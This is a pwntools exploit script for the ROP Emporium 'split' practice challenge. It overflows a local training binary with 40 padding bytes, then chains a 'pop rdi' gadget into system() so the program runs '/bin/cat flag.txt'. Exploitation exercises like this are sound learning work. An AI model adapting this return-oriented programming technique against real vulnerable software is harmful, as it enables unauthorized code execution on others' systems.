# https://ropemporium.com/challenge/split.html
from pwn import *

# from ghidra, we can see that there is a function named 'usefulFunction' that calls system(), but with the wrong arguments
# from gdb with pwndbg and a cyclic pattern, we get that the saved rip is at offset 40
# "/bin/cat flag.txt" is at 0x601060 (search "/bin/cat flag.txt")

context.terminal = ["gnome-terminal", "--"]
# shell = gdb.debug("./split", "continue")
shell = process("./split")

payload  = b"A" * 40
payload += p64(0x4007c3) # 0x4007c3 --> pop rdi ; ret
payload += p64(0x601060) # "/bin/cat flag.txt"
payload += p64(0x40074b) # offset inside usefulFunction() to avoid it pushing the original string to rdi

shell.sendlineafter(b"> ", payload)
shell.recvline()
flag = shell.recvline().decode().strip()
log.info(f"Flag: {flag}")

shell.close()
